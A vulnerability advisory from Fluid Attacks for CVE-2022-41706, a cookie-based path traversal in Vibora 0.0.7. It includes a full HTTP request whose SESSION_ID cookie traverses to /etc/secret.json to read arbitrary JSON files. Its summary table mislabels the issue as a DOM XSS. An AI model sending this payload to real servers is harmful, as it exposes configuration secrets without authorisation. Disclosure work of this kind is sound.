---
slug: advisories/buuren/
title: Vibora 0.0.7  -  Local File Read
authors: Carlos Bello
writer: cbello
codename: buuren
product: Vibora 0.0.7
date: 2022-10-13 06:00 COT
cveid: CVE-2022-41706
severity: 5.3
description: Vibora 0.0.7   -   Arbitrary Local File Read (LFR)
keywords: Fluid Attacks, Security, Vulnerabilities, Vibora, LFR
banner: advisories-bg
advise: yes
template: advisory
---

## Summary

|                       |                                                          |
| --------------------- | ---------------------------------------------------------|
| **Name**              | Vibora 0.0.7  -  DOM XSS to Account Takeover             |
| **Code name**         | [Buuren](https://en.wikipedia.org/wiki/Armin_van_Buuren) |
| **Product**           | Vibora                                                   |
| **Affected versions** | Version 0.0.7                                            |
| **State**             | Public                                                   |
| **Release date**      | 2022-10-13                                               |

## Vulnerability

|                       |                                                                                                             |
| --------------------- | ------------------------------------------------------------------------------------------------------------|
| **Kind**              | Lack of data validation - Path Traversal                                                                    |
| **Rule**              | [063. Lack of data validation - Path Traversal](https://docs.fluidattacks.com/criteria/vulnerabilities/063) |
| **Remote**            | Yes                                                                                                         |
| **CVSSv3 Vector**     | CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N                                                                |
| **CVSSv3 Base Score** | 5.3                                                                                                         |
| **Exploit available** | Yes                                                                                                         |
| **CVE ID(s)**         | [CVE-2022-41706](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-41706)                             |

## Description

Vibora version 0.0.7 allows an external attacker to read arbitrary json
files from the server. This is possible because the application does
not correctly validate the format of incoming cookies, thus allowing the
exploitation of a path traversal.

## Vulnerability

The application does not validate the cookie format correctly:

![image.png](https://user-images.githubusercontent.com/51862990/195723170-bc922f1f-5d64-4f43-8a45-2ccd5a0516a1.png)

The application uses the user's cookie to build a path where it will store
the session. Since no validation is performed on the cookie we send, we can
perform a path traversal to point to other files on the server. Since the
application reads the content of the files with the `json.loads()` function,
we can only get the content of json files from the server.

## Exploitation

To exploit this vulnerability, we will have to send a request with a malicious
cookie as shown below:

```txt
GET / HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Something
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Connection: close
Cookie: SESSION_ID=../../../../../../../../../../../../etc/secret.json
Cache-Control: max-age=0
```

## Evidence of exploitation

Here we can see what the server responds when we send the request with the
malicious cookie:

![image.png](https://user-images.githubusercontent.com/51862990/195723453-dd3de408-6918-4a75-946f-ace0bfc49654.png)

Here we can see that indeed the file we are pointing to is outside the
directory previously configured to save the sessions:

![image.png](https://user-images.githubusercontent.com/51862990/195723511-0379e13b-c193-415f-83e5-3068d47b342b.png)

## Impact

An unauthenticated remote attacker can read arbitrary JSON files from the
server. Since JSON is a format commonly used to store configurations, it
is likely to find sensitive information in them as well.

## Our security police

We have reserved the CVE-2022-41706 to refer to this issue from now on.

* https://fluidattacks.com/advisories/policy/

## System Information

* Version: Vibora 0.0.7

* Operating System: GNU/Linux

## Mitigation

There is currently no patch available for this vulnerability.

## Credits

The vulnerability was discovered by [Carlos
Bello](https://www.linkedin.com/in/carlos-andres-bello) from the Offensive
Team of `Fluid Attacks`.

## References

**Vendor page** <https://github.com/vibora-io/vibora>

## Timeline

<time-lapse
  discovered="2022-09-21"
  contacted="2022-09-21"
  replied="2022-09-21"
  confirmed=""
  patched=""
  disclosure="2022-10-13">
</time-lapse>
